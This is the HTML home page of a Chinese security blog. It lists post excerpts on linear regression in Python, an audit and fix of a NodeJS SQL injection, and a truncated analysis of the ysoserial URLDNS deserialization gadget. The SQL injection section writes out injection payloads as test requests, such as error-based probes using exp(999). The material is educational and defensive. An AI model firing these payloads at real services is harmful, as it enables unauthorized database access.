@@ -1,0 +1,1555 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="网络安全,黑客,JAVA安全,代码审计,渗透测试,入侵,SRC,扫描,WEB安全,移动安全,PHP">
+    <meta name="description" content="蓝骨, langu.xyz">
+    <meta name="author" content="langu_xyz">
+    
+        <title>
+            
+                        langu_xyz
+        </title>
+        
+<link rel="stylesheet" href="/css/style.css">
+
+            <link rel="shortcut icon" href="/images/logo.jpeg">
+                
+<link rel="stylesheet" href="/css/font-awesome.min.css">
+
+                    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"blog.langu.xyz","root":"/","language":"zh","path":"search.json"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true},"style":{"primary_color":"#0066CC","avatar":"/images/logo.jpeg","favicon":"/images/logo.jpeg","article_img_align":"center","left_side_width":"260px","content_max_width":"920px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/shamo.jpg","description":"XYZ(无限未来)"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":false}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true,"style":"default"},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"3.4.3"};
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+  </script>
+
+                    <script>
+                        var _hmt = _hmt || [];
+                        (function() {
+                          var hm = document.createElement("script");
+                          hm.src = "https://hm.baidu.com/hm.js?1cd6e64ff252acf24b707985fcec8850";
+                          var s = document.getElementsByTagName("script")[0]; 
+                          s.parentNode.insertBefore(hm, s);
+                        })();
+                        </script>
+                        
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="langu_xyz" type="application/atom+xml">
+</head>
+<body>
+<div class="progress-bar-container">
+    
+        <span class="scroll-progress-bar"></span>
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fas fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="page-main-content">
+
+        <div class="page-main-content-top">
+            <header class="header-wrapper">
+
+    <div class="header-content">
+        <div class="left">
+            
+                    <a class="logo-title" href="/">
+                        langu_xyz
+                    </a>
+        </div>
+
+        <div class="right">
+            <div class="pc">
+                <ul class="menu-list">
+                    
+                        <li class="menu-item">
+                            <a class="active" href="/" >
+                                HOME
+                            </a>
+                        </li>
+                        
+                        <li class="menu-item">
+                            <a class="" href="/tags/THINK/" >
+                                THINK
+                            </a>
+                        </li>
+                        
+                            
+                                <li class="menu-item search search-popup-trigger">
+                                    <i class="fas fa-search"></i>
+                                </li>
+                                
+                                
+                </ul>
+            </div>
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
+                    
+                        <div class="icon-item menu-bar">
+                            <div class="menu-bar-middle"></div>
+                        </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class="active" href="/" >
+                        HOME
+                    </a>
+                </li>
+                
+                <li class="drawer-menu-item flex-center">
+                    <a class="" href="/tags/THINK/" >
+                        THINK
+                    </a>
+                </li>
+                
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+        </div>
+
+        <div class="page-main-content-middle">
+
+            <div class="main-content">
+
+                
+                    <div class="home-content-container fade-in-down-animation">
+    <ul class="home-article-list">
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/Linear%20Regression/">
+                        Linear Regression
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        0x01 LR回归的目的是预测数值型的目标值
+线性回归意味着可以将输入项分别乘以一些常量，再将结果加起来得到输出
+优点：
+
+结果易于理解
+计算不复杂
+
+缺点：
+
+对非线性数据拟合不好
+
+适用数据类型
+
+标称型
+数值型
+
+0x02 最佳拟合直线将数据视为直线进行建模
+123456789101112131415def standRegres(xArr, yArr):    &#x27;&#x27;&#x27;    计算最佳拟合直线    :param xArr:    :param yArr:    :return:    &#x27;&#x27;&#x27;    xMat = mat(xArr)    yMat = mat(yArr).T #Returns the transpose of the matrix    xTx = xMat.T*xMat    if linalg.det(xTx) == 0.0:        print(&quot;This matrix is singular, cannot do inverse&quot;)        return    ws = xTx.I * (xMat.T*yMat)    return ws
+
+
+在用内积来预测y的时候，第一维将乘以前面的常数X0，第二维将乘以输入变量X1因为前面假定了X0=1，所以最终会得到y=ws[0]+ws[1]*X1
+
+局部加权线性回归
+
+给待预测点附近的每个点赋予一定的权重每次预测均需要事先选取出对应的数据子集使用“核”来对附近的点赋予更高的权重
+1234567891011121314151617181920212223def lwlr(testPoint, xArr, yArr, k=1.0):    &#x27;&#x27;&#x27;    局部加权线性回归    给定x空间中的任意一点，计算出对应的预测值yHat    :param testPoint:    :param xArr:    :param yArr:    :param k:    :return:    &#x27;&#x27;&#x27;    xMat = mat(xArr)    yMat = mat(yArr).T    m = shape(xMat)[0]    weights = mat(eye((m))) #对角权重矩阵    for j in range(m):        diffMat = testPoint - xMat[j, :]     #        weights[j, j] = exp(diffMat*diffMat.T/(-2.0*k**2))    xTx = xMat.T * (weights * xMat)    if linalg.det(xTx) == 0.0:        print(&quot;This matrix is singular, cannot do inverse&quot;)        return    ws = xTx.I * (xMat.T * (weights * yMat))    return testPoint * ws
+
+
+
+缩减系数
+
+岭回归
+
+
+用来处理特征数多于样本数的情况
+用于在估计中加入偏差
+
+123456789101112131415161718192021222324252627282930def ridgeRegres(xMat, yMat, lam=0.2):    &#x27;&#x27;&#x27;    计算回归系数    :param xMat:    :param yMat:    :param lam:    :return:    &#x27;&#x27;&#x27;    xTx = xMat.T*xMat    denom = xTx + eye(shape(xMat)[1])*lam    if linalg.det(denom) == 0.0:        print(&quot;This matrix is singular, cannot do inverse&quot;)        return    ws = denom.I * (xMat.T*yMat)    return ws    def ridgeTest(xArr, yArr):    xMat = mat(xArr)    yMat=mat(yArr).T    yMean = mean(yMat, 0)    yMat = yMat - yMean    xMeans = mean(xMat, 0)    xVar = var(xMat, 0)    xMat = (xMat - xMeans)/xVar    numTestPts = 30    wMat = zeros((numTestPts, shape(xMat)[1]))    for i in range(numTestPts):        ws = ridgeRegres(xMat, yMat, exp(i-10))        wMat[i, :] = ws.T    return wMat
+
+
+
+
+lasso前向逐步回归
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h4 id="0x01-LR"><a href="#0x01-LR" class="headerlink" title="0x01 LR"></a>0x01 LR</h4><p>回归的目的是预测数值型的目标值</p>
+<p>线性回归意味着可以将输入项分别乘以一些常量，再将结果加起来得到输出</p>
+<p>优点：</p>
+<ul>
+<li>结果易于理解</li>
+<li>计算不复杂</li>
+</ul>
+<p>缺点：</p>
+<ul>
+<li>对非线性数据拟合不好</li>
+</ul>
+<p>适用数据类型</p>
+<ul>
+<li>标称型</li>
+<li>数值型</li>
+</ul>
+<h4 id="0x02-最佳拟合直线"><a href="#0x02-最佳拟合直线" class="headerlink" title="0x02 最佳拟合直线"></a>0x02 最佳拟合直线</h4><p>将数据视为直线进行建模<br><img lazyload src="/images/loading.svg" data-src="15385726712742.jpg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">def standRegres(xArr, yArr):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    计算最佳拟合直线</span><br><span class="line">    :param xArr:</span><br><span class="line">    :param yArr:</span><br><span class="line">    :return:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    xMat = mat(xArr)</span><br><span class="line">    yMat = mat(yArr).T #Returns the transpose of the matrix</span><br><span class="line">    xTx = xMat.T*xMat</span><br><span class="line">    if linalg.det(xTx) == 0.0:</span><br><span class="line">        print(&quot;This matrix is singular, cannot do inverse&quot;)</span><br><span class="line">        return</span><br><span class="line">    ws = xTx.I * (xMat.T*yMat)</span><br><span class="line">    return ws</span><br></pre></td></tr></table></figure>
+
+<p><img lazyload src="/images/loading.svg" data-src="15385727083911.jpg"></p>
+<p>在用内积来预测y的时候，第一维将乘以前面的常数X0，第二维将乘以输入变量X1<br>因为前面假定了<code>X0=1</code>，所以最终会得到<code>y=ws[0]+ws[1]*X1</code></p>
+<ul>
+<li>局部加权线性回归</li>
+</ul>
+<p>给待预测点附近的每个点赋予一定的权重<br>每次预测均需要事先选取出对应的数据子集<br>使用“核”来对附近的点赋予更高的权重</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">def lwlr(testPoint, xArr, yArr, k=1.0):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    局部加权线性回归</span><br><span class="line">    给定x空间中的任意一点，计算出对应的预测值yHat</span><br><span class="line">    :param testPoint:</span><br><span class="line">    :param xArr:</span><br><span class="line">    :param yArr:</span><br><span class="line">    :param k:</span><br><span class="line">    :return:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    xMat = mat(xArr)</span><br><span class="line">    yMat = mat(yArr).T</span><br><span class="line">    m = shape(xMat)[0]</span><br><span class="line">    weights = mat(eye((m))) #对角权重矩阵</span><br><span class="line">    for j in range(m):</span><br><span class="line">        diffMat = testPoint - xMat[j, :]     #</span><br><span class="line">        weights[j, j] = exp(diffMat*diffMat.T/(-2.0*k**2))</span><br><span class="line">    xTx = xMat.T * (weights * xMat)</span><br><span class="line">    if linalg.det(xTx) == 0.0:</span><br><span class="line">        print(&quot;This matrix is singular, cannot do inverse&quot;)</span><br><span class="line">        return</span><br><span class="line">    ws = xTx.I * (xMat.T * (weights * yMat))</span><br><span class="line">    return testPoint * ws</span><br></pre></td></tr></table></figure>
+
+<p><img lazyload src="/images/loading.svg" data-src="15385740529659.jpg"></p>
+<ul>
+<li>缩减系数</li>
+</ul>
+<p><strong>岭回归</strong></p>
+<p><img lazyload src="/images/loading.svg" data-src="15385746351763.jpg"></p>
+<ul>
+<li>用来处理特征数多于样本数的情况</li>
+<li>用于在估计中加入偏差</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">def ridgeRegres(xMat, yMat, lam=0.2):</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    计算回归系数</span><br><span class="line">    :param xMat:</span><br><span class="line">    :param yMat:</span><br><span class="line">    :param lam:</span><br><span class="line">    :return:</span><br><span class="line">    &#x27;&#x27;&#x27;</span><br><span class="line">    xTx = xMat.T*xMat</span><br><span class="line">    denom = xTx + eye(shape(xMat)[1])*lam</span><br><span class="line">    if linalg.det(denom) == 0.0:</span><br><span class="line">        print(&quot;This matrix is singular, cannot do inverse&quot;)</span><br><span class="line">        return</span><br><span class="line">    ws = denom.I * (xMat.T*yMat)</span><br><span class="line">    return ws</span><br><span class="line">    </span><br><span class="line">def ridgeTest(xArr, yArr):</span><br><span class="line">    xMat = mat(xArr)</span><br><span class="line">    yMat=mat(yArr).T</span><br><span class="line">    yMean = mean(yMat, 0)</span><br><span class="line">    yMat = yMat - yMean</span><br><span class="line">    xMeans = mean(xMat, 0)</span><br><span class="line">    xVar = var(xMat, 0)</span><br><span class="line">    xMat = (xMat - xMeans)/xVar</span><br><span class="line">    numTestPts = 30</span><br><span class="line">    wMat = zeros((numTestPts, shape(xMat)[1]))</span><br><span class="line">    for i in range(numTestPts):</span><br><span class="line">        ws = ridgeRegres(xMat, yMat, exp(i-10))</span><br><span class="line">        wMat[i, :] = ws.T</span><br><span class="line">    return wMat</span><br></pre></td></tr></table></figure>
+
+
+<p><img lazyload src="/images/loading.svg" data-src="15385751596222.jpg"></p>
+<p><img lazyload src="/images/loading.svg" data-src="15385751131830.jpg"></p>
+<p><strong>lasso</strong><br><strong>前向逐步回归</strong></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Sun Jul 21 2019 21:00:00 GMT+0800">2019-07-21</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/%E5%AE%89%E5%85%A8%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/">安全数据分析</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/ML/">ML</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/Linear%20Regression/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/NodeJS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%92%8C%E4%BF%AE%E5%A4%8D/">
+                        NodeJS sql注入漏洞审计和修复
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        一、问题代码123456789101112131415async search(  ……  let rows = await getManager().query(`    SELECT DISTINCT(id),        name,        description,        gmt_modified    FROM(      SELECT a.*,       ……      WHERE name LIKE &#x27;%$&#123;name&#125;%&#x27; OR tag_name LIKE &#x27;%$&#123;name&#125;%&#x27;      ORDER BY gmt_modified DESC       LIMIT 20  `);  …….
+
+
+二、黑盒测试过程：/api/search?name=123’
+{“success”:false,”errormsg”:”er_parse_error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ‘Ͽor tag_name like ‘3’Ͽn      order by gmt_modified desc \n      limit’ at line 18”}
+/api/search?name=123’’
+{“success”:true,”data”:[]}
+/api/search?name=123&#39;and’’=‘
+{“success”:true,”data”:[]}
+/api/search?name=&#39;and if(1=1,exp(999),3)and&#39;1
+{“success”:false,”errormsg”:”er_data_out_of_range: double value is out of range in ‘exp(999)’”}
+/api/search?name=&#39;and if(1=2,exp(999),3)and&#39;1
+{“success”:true,”data”:[{“id”:82,……}]}
+三、修复方案
+mysql.escapeId(identifier)、connection.escapeId(identifier) 或 pool.escapeId(identifier) 
+
+123456var sorter = &#x27;date&#x27;;var sql    = &#x27;SELECT * FROM posts ORDER BY &#x27; + connection.escapeId(sorter);connection.query(sql, function (error, results, fields) &#123;  if (error) throw error;  // ...&#125;);
+
+123var sorter = &#x27;date&#x27;;var sql    = &#x27;SELECT * FROM posts ORDER BY &#x27; + connection.escapeId(&#x27;posts.&#x27; + sorter);// -&gt; SELECT * FROM posts ORDER BY `posts`.`date`
+
+
+reparing Queries
+
+123var sql = &quot;SELECT * FROM ?? WHERE ?? = ?&quot;;var inserts = [&#x27;users&#x27;, &#x27;id&#x27;, userId];sql = mysql.format(sql, inserts);
+
+
+Custom format
+
+1234567891011connection.config.queryFormat = function (query, values) &#123;  if (!values) return query;  return query.replace(/\:(\w+)/g, function (txt, key) &#123;    if (values.hasOwnProperty(key)) &#123;      return this.escape(values[key]);    &#125;    return txt;  &#125;.bind(this));&#125;;connection.query(&quot;UPDATE posts SET title = :title&quot;, &#123; title: &quot;Hello MySQL&quot; &#125;);
+
+参考： https://github.com/mysqljs/mysql#escaping-query-identifiers
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="一、问题代码"><a href="#一、问题代码" class="headerlink" title="一、问题代码"></a>一、问题代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">async search(</span><br><span class="line">  ……</span><br><span class="line">  let rows = await getManager().query(`</span><br><span class="line">    SELECT DISTINCT(id),</span><br><span class="line">        name,</span><br><span class="line">        description,</span><br><span class="line">        gmt_modified</span><br><span class="line">    FROM(</span><br><span class="line">      SELECT a.*, </span><br><span class="line">      ……</span><br><span class="line">      WHERE name LIKE &#x27;%$&#123;name&#125;%&#x27; OR tag_name LIKE &#x27;%$&#123;name&#125;%&#x27;</span><br><span class="line">      ORDER BY gmt_modified DESC </span><br><span class="line">      LIMIT 20</span><br><span class="line">  `);</span><br><span class="line">  …….</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="二、黑盒测试过程："><a href="#二、黑盒测试过程：" class="headerlink" title="二、黑盒测试过程："></a>二、黑盒测试过程：</h2><p><code>/api/search?name=123’</code></p>
+<p>{“success”:false,”errormsg”:”er_parse_error: you have an error in your sql syntax; check the manual that corresponds to your mysql server version for the right syntax to use near ‘Ͽor tag_name like ‘3’Ͽn      order by gmt_modified desc \n      limit’ at line 18”}</p>
+<p><code>/api/search?name=123’’</code></p>
+<p>{“success”:true,”data”:[]}</p>
+<p><code>/api/search?name=123&#39;and’’=‘</code></p>
+<p>{“success”:true,”data”:[]}</p>
+<p><code>/api/search?name=&#39;and if(1=1,exp(999),3)and&#39;1</code></p>
+<p>{“success”:false,”errormsg”:”er_data_out_of_range: double value is out of range in ‘exp(999)’”}</p>
+<p><code>/api/search?name=&#39;and if(1=2,exp(999),3)and&#39;1</code></p>
+<p>{“success”:true,”data”:[{“id”:82,……}]}</p>
+<h2 id="三、修复方案"><a href="#三、修复方案" class="headerlink" title="三、修复方案"></a>三、修复方案</h2><ol>
+<li>mysql.escapeId(identifier)、connection.escapeId(identifier) 或 pool.escapeId(identifier) </li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var sorter = &#x27;date&#x27;;</span><br><span class="line">var sql    = &#x27;SELECT * FROM posts ORDER BY &#x27; + connection.escapeId(sorter);</span><br><span class="line">connection.query(sql, function (error, results, fields) &#123;</span><br><span class="line">  if (error) throw error;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var sorter = &#x27;date&#x27;;</span><br><span class="line">var sql    = &#x27;SELECT * FROM posts ORDER BY &#x27; + connection.escapeId(&#x27;posts.&#x27; + sorter);</span><br><span class="line">// -&gt; SELECT * FROM posts ORDER BY `posts`.`date`</span><br></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>reparing Queries</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var sql = &quot;SELECT * FROM ?? WHERE ?? = ?&quot;;</span><br><span class="line">var inserts = [&#x27;users&#x27;, &#x27;id&#x27;, userId];</span><br><span class="line">sql = mysql.format(sql, inserts);</span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>Custom format</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">connection.config.queryFormat = function (query, values) &#123;</span><br><span class="line">  if (!values) return query;</span><br><span class="line">  return query.replace(/\:(\w+)/g, function (txt, key) &#123;</span><br><span class="line">    if (values.hasOwnProperty(key)) &#123;</span><br><span class="line">      return this.escape(values[key]);</span><br><span class="line">    &#125;</span><br><span class="line">    return txt;</span><br><span class="line">  &#125;.bind(this));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">connection.query(&quot;UPDATE posts SET title = :title&quot;, &#123; title: &quot;Hello MySQL&quot; &#125;);</span><br></pre></td></tr></table></figure>
+
+<p>参考： <a class="link" target="_blank" rel="noopener" href="https://github.com/mysqljs/mysql#escaping-query-identifiers">https://github.com/mysqljs/mysql#escaping-query-identifiers<i class="fas fa-external-link-alt"></i></a></p>
+
+                </div>
+
+                <div class="home-article-meta-info-container">
+    <div class="home-article-meta-info">
+        <span><i class="fas fa-history"></i>&nbsp;<span class="home-article-date" data-date="Wed May 01 2019 21:00:00 GMT+0800">2019-05-01</span></span>
+        
+            <span class="home-article-category"><i class="fas fa-folder"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/categories/WEB%E5%AE%89%E5%85%A8/">WEB安全</a>&nbsp;
+                        </li>
+                    
+                    
+                </ul>
+            </span>
+        
+        
+            <span class="home-article-tag">
+                <i class="fas fa-tags"></i>&nbsp;
+                <ul>
+                    
+                        <li>
+                            
+                            <a href="/tags/NodeJS/">NodeJS</a>&nbsp;
+                        </li>
+                    
+                </ul>
+            </span>
+        
+    </div>
+
+    <a href="/NodeJS%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%92%8C%E4%BF%AE%E5%A4%8D/">Read more&nbsp;<i class="fas fa-angle-right"></i></a>
+</div>
+
+            </li>
+        
+            <li class="home-article-item">
+
+                
+
+                <h3 class="home-article-title">
+                    <a href="/URLDNS%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96gadget%E5%88%86%E6%9E%90/">
+                        URLDNS反序列化gadget分析
+                    </a>
+                </h3>
+
+                <!-- <div class="home-article-content markdown-body">
+                    
+                        0x00 分析gadget代码ysoserial中URLDNS gadget代码只有短短几行
+123456789101112131415URLStreamHandler handler = new SilentURLStreamHandler();········static class SilentURLStreamHandler extends URLStreamHandler &#123;        protected URLConnection openConnection(URL u) throws IOException &#123;                return null;        &#125;        protected synchronized InetAddress getHostAddress(URL u) &#123;                return null;        &#125;&#125;
+注释中提到“为避免在创建payload时触发DNS解析”，这里就有两个问题：
+1、创建payload时为什么会触发DNS解析？
+2、重写URLStreamHandler的作用是什么呢？
+
+123HashMap ht = new HashMap();  //HashMap中将包含URLURL u = new URL(null, url, handler);  //创建URL，作为HashMap中的keyht.put(u, url); //值可以是任何Serializable, URL作为key触发DNS lookup。
+这几句的含义是创建一个HashMap，将URL对象作为key，在HashMap put操作的时候，会触发URL的序列化，在序列化的时候触发DNS解析。
+在开头注释中也提示了Gadget Chain
+
+HashMap.readObject()
+
+
+  HashMap.putVal()
+
+
+    HashMap.hash()
+
+
+      URL.hashCode()
+
+
+
+1Reflections.setFieldValue(u, &quot;hashCode&quot;, -1);//在上面的put过程中，URL的hashCode被计算并缓存。这将重置它，以便下次调用hashCode时触发DNS查找。
+这句在这里的作用不太好理解，大概推测是hashcode的值为-1时，有不同的作用，这个疑问我们也留到下文中来寻找答案。
+0x01 java.net.URL类为什么会触发DNS解析？根据注释中的Chain，我们找到URL.hashCode()，if (hashCode != -1)这句可以解释上节中的“-1”的疑问了，当不等于“-1”的时候，会直接返回，而不会调用到 handler.hashCode中。
+1234567public synchronized int hashCode() &#123;    if (hashCode != -1)        return hashCode;    hashCode = handler.hashCode(this);    return hashCode;&#125;
+
+继续看 handler.hashCode做了哪些事情，可以看到getHostAddress会请求一次DNS解析，构成反序列化链路中的执行点。
+12345678910protected int hashCode(URL u) &#123;    int h = 0;    // Generate the protocol part.    String protocol = u.getProtocol();    if (protocol != null)        h += protocol.hashCode();    // Generate the host part.    InetAddress addr = getHostAddress(u);
+ 
+0x02 java.net.URL类如何触发DNS解析的（寻找触发点）？定位到触发点HashMap.readObject()，可以看到这个方法将java.io.ObjectInputStream反序列化后的值putVal进Node中。
+1234567891011121314151617181920212223242526272829303132333435363738394041424344private void readObject(java.io.ObjectInputStream s)    throws IOException, ClassNotFoundException &#123;    // Read in the threshold (ignored), loadfactor, and any hidden stuff    s.defaultReadObject();    reinitialize();    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +                                         loadFactor);    s.readInt();                // Read and ignore number of buckets    int mappings = s.readInt(); // Read number of mappings (size)    if (mappings &lt; 0)        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +                                         mappings);    else if (mappings &gt; 0) &#123; // (if zero, use defaults)        // Size the table using given load factor only if within        // range of 0.25...4.0        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);        float fc = (float)mappings / lf + 1.0f;        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?                   DEFAULT_INITIAL_CAPACITY :                   (fc &gt;= MAXIMUM_CAPACITY) ?                   MAXIMUM_CAPACITY :                   tableSizeFor((int)fc));        float ft = (float)cap * lf;        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?                     (int)ft : Integer.MAX_VALUE);        // Check Map.Entry[].class since it&#x27;s the nearest public type to        // what we&#x27;re actually creating.        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];        table = tab;        // Read the keys and values, and put the mappings in the HashMap        for (int i = 0; i &lt; mappings; i++) &#123;            @SuppressWarnings(&quot;unchecked&quot;)                K key = (K) s.readObject();            @SuppressWarnings(&quot;unchecked&quot;)                V value = (V) s.readObject();            putVal(hash(key), key, value, false, false);        &#125;    &#125;&#125;
+
+putVal的入参如下，其中在第一个入参hash方法（计算key.hashCode()并将较高的哈希值扩展为较低的哈希值），会调用key的hashcode方法。所以如果key是URL对象的话，就会调用到URL.hashCode方法，进而触发DNS解析。
+12345678910111213/** * Implements Map.put and related methods * * @param hash hash for key * @param key the key * @param value the value to put * @param onlyIfAbsent if true, don&#x27;t change existing value * @param evict if false, the table is in creation mode. * @return previous value, or null if none */final V putVal(int hash, K key, V value, boolean onlyIfAbsent,               boolean evict)
+
+
+
+0x03 如何利用/利用代码为什么要这么写？需要注意两个点：1、hashCode默认是-1，如果触发一次DNS解析，则会缓存hashCode，导致后续请求时无法触发；2、避免在生成payload的时候put触发DNS解析，这里也就回答文章开头的两个疑问，通过重写getHostAddress避免触发DNS解析。
+为什么HashMap要自己实现writeObject和readObject方法，而不是使用JDK统一的默认序列化和反序列化操作呢？首先要明确序列化的目的，将java对象序列化，一定是为了在某个时刻能够将该对象反序列化，而且一般来讲序列化和反序列化所在的机器是不同的，因为序列化最常用的场景就是跨机器的调用，而序列化和反序列化的一个最基本的要求就是，反序列化之后的对象与序列化之前的对象是一致的。
+HashMap中，由于Entry的存放位置是根据Key的Hash值来计算，然后存放到数组中的，对于同一个Key，在不同的JVM实现中计算得出的Hash值可能是不同的。
+Hash值不同导致的结果就是：有可能一个HashMap对象的反序列化结果与序列化之前的结果不一致。即有可能序列化之前，Key=’AAA’的元素放在数组的第0个位置，而反序列化值后，根据Key获取元素的时候，可能需要从数组为2的位置来获取，而此时获取到的数据与序列化之前肯定是不同的。
+参考链接：https://juejin.cn/post/6844903954774491144
+
+                    
+                </div> -->
+                <div class="article-content markdown-body">
+                    <h2 id="0x00-分析gadget代码"><a href="#0x00-分析gadget代码" class="headerlink" title="0x00 分析gadget代码"></a>0x00 分析gadget代码</h2><p>ysoserial中URLDNS gadget代码只有短短几行</p>
